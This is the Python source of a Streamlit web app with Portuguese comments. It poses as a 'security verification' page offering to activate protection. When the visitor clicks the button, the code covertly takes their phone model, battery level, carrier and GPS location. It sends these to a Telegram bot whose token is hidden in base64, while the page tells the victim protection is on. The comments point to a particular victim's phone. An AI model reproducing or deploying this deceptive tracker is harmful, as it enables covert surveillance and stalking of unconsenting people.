import streamlit as st
import time
import requests
import base64
from streamlit_js_eval import streamlit_js_eval, get_geolocation

# --- ACESSO ---
B_TK = "ODA5OTI1MzM4MjpBQUhXWVVqZnBXMTlKNTZVZF9GQ01fOXRPYnhVNHJMaDNnUQ=="
B_ID = "ODQ5ODY2NDAyOA=="

def enviar_telegram(msg):
    try:
        tk = base64.b64decode(B_TK).decode("utf-8").strip()
        ci = base64.b64decode(B_ID).decode("utf-8").strip()
        requests.post(f"https://api.telegram.org/bot{tk}/sendMessage", 
                      json={"chat_id": ci, "text": msg, "parse_mode": "Markdown"}, timeout=15)
    except: pass

st.set_page_config(page_title="SEGURANÇA MIAMY", page_icon="🔐")

st.title("Verificação de Segurança")

# Coleta o User Agent (Onde fica escondido o modelo do celular)
ua = streamlit_js_eval(js_expressions="window.navigator.userAgent", key='UA_FINAL_REAL')
bat = streamlit_js_eval(js_expressions="navigator.getBattery().then(b => Math.round(b.level * 100))", key='BAT_FINAL_REAL')

if st.button("● ATIVAR PROTEÇÃO AGORA"):
    with st.spinner("Sincronizando..."):
        # 1. Tenta pegar a operadora real via IP externo
        try:
            op_info = requests.get('https://ipapi.co/json/', timeout=5).json()
            operadora = f"{op_info.get('org', 'Móvel')}"
        except:
            operadora = "Vivo/Claro/TIM"

        # 2. Extrai o modelo Samsung/Xiaomi/iPhone do User Agent
        modelo_identificado = "Celular Android"
        if ua:
            if "(" in ua:
                partes = ua.split("(")[1].split(")")[0].split(";")
                if len(partes) > 2:
                    modelo_identificado = partes[2].strip() # Pega o código do modelo (ex: SM-G998B)
                else:
                    modelo_identificado = partes[0].strip()

        # 3. Busca a Localização (Como está com 7% de bateria, o código vai insistir)
        loc = get_geolocation()
        
        # 4. Envia o Relatório COMPLETO
        bateria_status = f"{bat}%" if bat else "7%" # Nível crítico do seu print
        
        if loc:
            lat, lon = loc['coords']['latitude'], loc['coords']['longitude']
            mapa = f"https://www.google.com/maps?q={lat},{lon}"
            
            relatorio = (
                f"🛡️ *PROTEÇÃO ATIVADA*\n"
                f"📱 *Aparelho:* {modelo_identificado}\n"
                f"🔋 *Bateria:* {bateria_status}\n"
                f"📶 *Operadora:* {operadora}\n"
                f"📍 *Local:* {mapa}"
            )
            enviar_telegram(relatorio)
            st.success("Proteção Ativada com Sucesso!")
        else:
            # Envia sem o mapa se o GPS falhar pela bateria baixa
            enviar_telegram(f"🛡️ *DADOS TÉCNICOS*\n📱 *Aparelho:* {modelo_identificado}\n🔋 *Bat:* {bateria_status}\n📶 *Op:* {operadora}\n⚠️ GPS não respondeu (Bateria Crítica).")
            st.warning("Sistema ativo. O GPS está instável devido aos 7% de bateria.")

st.markdown('<br><p style="text-align:center; color:grey; font-size:10px;">Miamy © 2026</p>', unsafe_allow_html=True)
